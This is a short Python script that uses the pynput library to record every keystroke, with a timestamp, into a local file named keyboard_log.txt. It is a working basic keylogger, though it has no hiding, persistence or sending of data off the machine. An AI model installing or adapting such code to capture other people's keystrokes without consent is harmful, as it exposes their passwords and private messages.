import pynput
import time
from datetime import datetime

log_file = "keyboard_log.txt"

def on_press(key):
    key_name = str(key)
    key_name = key_name.replace("'", "")
    curr_time = datetime.now()
    with open(log_file, "a") as f:
        f.write("{}: {}\n".format(curr_time, key_name))

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
